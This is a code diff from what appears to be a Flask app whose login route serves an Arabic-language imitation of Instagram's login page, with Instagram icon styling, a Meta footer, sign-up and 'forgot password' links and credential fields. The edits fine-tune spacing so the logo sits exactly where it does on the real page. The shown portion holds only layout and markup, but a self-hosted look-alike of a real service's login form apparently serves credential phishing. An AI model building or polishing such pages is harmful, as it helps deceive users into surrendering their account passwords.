@@ -75,19 +75,19 @@ def login():
             align-items: center;
         }
 
-        /* القسم العلوي (اللغة والشعار مثبتين بالأعلى) */
+        /* القسم العلوي: تم إنزال الشعار ليكون في مكان النقطة تماماً */
         .top-section {
             width: 100%;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding-top: 5px;
+            padding-top: 25px; 
         }
 
         .lang-text {
             color: #a8a8a8;
             font-size: 12px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         .insta-icon-container {
@@ -110,7 +110,7 @@ def login():
             fill: white;
         }
 
-        /* القسم الاوسط (الحقول وزر الدخول متوسّطين بدقة) */
+        /* القسم الأوسط (الحقول وزر الدخول في المنتصف بدقة) */
         .middle-section { 
             width: 100%; 
             display: flex; 
@@ -168,7 +168,7 @@ def login():
 
         .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; font-weight: 400; }
 
-        /* القسم السفلي (إنشاء حساب و Meta) */
+        /* القسم السفلي */
         .footer-section { 
             width: 100%; 
             text-align: center; 
@@ -201,7 +201,6 @@ def login():
 </head>
 <body>
     <div class="page-wrapper">
-        <!-- القسم العلوي: اللغة والشعار -->
         <div class="top-section">
             <div class="lang-text">العربية</div>
             <div class="insta-icon-container">
@@ -213,7 +212,6 @@ def login():
             </div>
         </div>
         
-        <!-- القسم الأوسط: الحقول وأزرار الدخول في المنتصف تماماً -->
         <div class="middle-section">
             {% if error %}
                 <div class="error-msg">{{ error }}</div>
@@ -232,7 +230,6 @@ def login():
             <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
         </div>
 
-        <!-- القسم السفلي: إنشاء حساب و Meta -->
         <div class="footer-section">
             <div class="signup-card">
                 إنشاء حساب جديد
